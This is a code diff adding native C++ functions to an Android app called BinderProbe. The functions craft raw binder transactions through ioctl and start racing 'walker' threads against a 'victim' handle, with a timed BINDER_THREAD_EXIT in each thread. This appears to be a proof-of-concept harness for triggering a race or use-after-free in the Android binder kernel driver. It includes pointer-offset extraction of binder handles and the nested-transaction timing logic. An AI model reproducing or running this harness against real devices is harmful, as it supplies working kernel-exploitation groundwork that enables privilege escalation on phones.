@@ -12,6 +12,7 @@
 #include <cstring>
 #include <cstdio>
 #include <cstdlib>
+#include <pthread.h>
 
 #define TAG "BinderProbeNative"
 
@@ -209,6 +210,140 @@ Java_org_opencrown_binderprobe_MainActivity_nativeObjectHandles(
     return r1 == value + 1 ? r1 : (r2 == value + 2 ? r2 : -42);
 }
 
+
+
+static int32_t handle_of_data(jlong native_data) {
+    void* p = reinterpret_cast<void*>(native_data);
+    if (p == nullptr) return -1;
+    void* ibinder = *reinterpret_cast<void**>(p);
+    if (ibinder == nullptr) return -1;
+    return *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(ibinder) + 0x10);
+}
+
+static int raw_send(int fd, int32_t handle, uint32_t code, uint32_t flags,
+                    void* data, size_t size) {
+    struct {
+        uint32_t command;
+        struct binder_transaction_data transaction;
+    } __attribute__((packed)) packet;
+    memset(&packet, 0, sizeof(packet));
+    packet.command = BC_TRANSACTION;
+    packet.transaction.target.handle = (uint32_t)handle;
+    packet.transaction.code = code;
+    packet.transaction.flags = flags;
+    packet.transaction.data_size = size;
+    packet.transaction.offsets_size = 0;
+    packet.transaction.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)data;
+    packet.transaction.data.ptr.offsets = 0;
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(packet);
+    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&packet;
+    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) return -1;
+    return bwr.write_consumed == sizeof(packet) ? 0 : -2;
+}
+
+static int wait_for_child(int fd, uint32_t expected_code) {
+    unsigned char buffer[8192];
+    for (int round = 0; round < 64; round++) {
+        struct binder_write_read bwr;
+        memset(&bwr, 0, sizeof(bwr));
+        bwr.read_size = sizeof(buffer);
+        bwr.read_buffer = (binder_uintptr_t)(uintptr_t)buffer;
+        if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) {
+            if (errno == EINTR) { round--; continue; }
+            return -1;
+        }
+        size_t pos = 0;
+        while (pos + 4 <= bwr.read_consumed) {
+            uint32_t cmd;
+            memcpy(&cmd, buffer + pos, 4);
+            pos += 4;
+            if (cmd == BR_TRANSACTION) {
+                struct binder_transaction_data* tr =
+                    reinterpret_cast<struct binder_transaction_data*>(buffer + pos);
+                if (tr->code == expected_code) {
+                    struct { uint32_t command; binder_uintptr_t buffer; } __attribute__((packed)) fp;
+                    fp.command = BC_FREE_BUFFER; fp.buffer = tr->data.ptr.buffer;
+                    struct binder_write_read fbwr; memset(&fbwr, 0, sizeof(fbwr));
+                    fbwr.write_size = sizeof(fp); fbwr.write_buffer = (binder_uintptr_t)(uintptr_t)&fp;
+                    ioctl(fd, BINDER_WRITE_READ, &fbwr);
+                    return 0;
+                }
+                pos += sizeof(struct binder_transaction_data);
+                continue;
+            }
+            if (cmd == BR_DEAD_REPLY || cmd == BR_FAILED_REPLY) return -2;
+            ssize_t extra = 0;
+            switch (cmd) {
+                case BR_REPLY: extra = sizeof(struct binder_transaction_data); break;
+                case BR_TRANSACTION_SEC_CTX: extra = sizeof(struct binder_transaction_data_secctx); break;
+                case BR_ERROR: case BR_ACQUIRE_RESULT: extra = 4; break;
+                case BR_INCREFS: case BR_ACQUIRE: case BR_RELEASE: case BR_DECREFS: extra = 16; break;
+                case BR_DEAD_BINDER: case BR_CLEAR_DEATH_NOTIFICATION_DONE: extra = 8; break;
+                default: extra = 0; break;
+            }
+            pos += (size_t)extra;
+        }
+    }
+    return -3;
+}
+
+struct walker_arg { int fd; int32_t handle; int index; };
+
+static void* walker_worker(void* opaque) {
+    struct walker_arg* arg = reinterpret_cast<struct walker_arg*>(opaque);
+    int fd = arg->fd;
+    int32_t handle = arg->handle;
+    int index = arg->index;
+    free(arg);
+    int send_rc = raw_send(fd, handle, 1, 0, nullptr, 0);
+    int child_rc = wait_for_child(fd, 2);
+    __android_log_print(ANDROID_LOG_INFO, TAG, "worker index=%d send=%d child=%d", index, send_rc, child_rc);
+    if (child_rc == 0) {
+        usleep(100000 + (useconds_t)index * 5000);
+    }
+    (void)ioctl(fd, BINDER_THREAD_EXIT, 0);
+    __android_log_print(ANDROID_LOG_INFO, TAG, "worker index=%d exited", index);
+    return nullptr;
+}
+
+extern "C" JNIEXPORT jint JNICALL
+Java_org_opencrown_binderprobe_HarnessNative_handleOf(
+        JNIEnv*, jobject, jlong native_data) {
+    return handle_of_data(native_data);
+}
+
+extern "C" JNIEXPORT jint JNICALL
+Java_org_opencrown_binderprobe_HarnessNative_walkerStart(
+        JNIEnv*, jobject, jlong victim_native_data, jint threads) {
+    int fd = find_binder_fd();
+    int32_t handle = handle_of_data(victim_native_data);
+    __android_log_print(ANDROID_LOG_INFO, TAG, "walkerStart fd=%d victim_handle=%d threads=%d", fd, handle, threads);
+    if (fd < 0 || handle < 0) return -1;
+    for (int i = 0; i < threads; i++) {
+        struct walker_arg* arg = static_cast<struct walker_arg*>(malloc(sizeof(*arg)));
+        if (arg == nullptr) break;
+        arg->fd = fd; arg->handle = handle; arg->index = i;
+        pthread_t thread;
+        if (pthread_create(&thread, nullptr, walker_worker, arg) != 0) {
+            free(arg);
+            break;
+        }
+        pthread_detach(thread);
+    }
+    return 0;
+}
+
+extern "C" JNIEXPORT jint JNICALL
+Java_org_opencrown_binderprobe_HarnessNative_victimChild(
+        JNIEnv*, jobject, jlong walker_native_data) {
+    int fd = find_binder_fd();
+    int32_t handle = handle_of_data(walker_native_data);
+    __android_log_print(ANDROID_LOG_INFO, TAG, "victimChild fd=%d walker_handle=%d", fd, handle);
+    if (fd < 0 || handle < 0) return -1;
+    return raw_send(fd, handle, 2, 0, nullptr, 0);
+}
 
 extern "C" JNIEXPORT jint JNICALL
 Java_org_opencrown_binderprobe_MainActivity_nativeHandleFromData(
